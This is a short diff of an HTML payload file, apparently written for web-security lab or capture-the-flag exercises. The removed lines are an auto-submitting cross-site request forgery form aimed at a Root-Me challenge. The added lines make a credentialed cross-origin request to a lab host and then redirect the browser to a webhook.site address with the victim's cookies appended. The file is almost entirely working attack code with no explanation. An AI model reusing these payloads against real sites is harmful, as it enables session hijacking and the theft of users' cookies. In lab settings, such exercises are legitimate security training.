@@ -1,11 +1,11 @@
 <html>
 	<body>	
-        <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
-        <input type="hidden" name="username" value="hello">
-		<input type="hidden" name="status" value="on" >
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
+	<script> 
+		 var req = new XMLHttpRequest();
+		 req.onload = reqListener;
+		 req.open('get','http://ptl-ad42da05-c93d6931.libcurl.so/',true);
+		 req.withCredentials = true; req.send();
+		 function reqListener() { location='https://webhook.site/c480f589-03da-43e1-b36f-783136f23c00?key='+document.cookie; };
+	 </script>
     </body>
 </html>
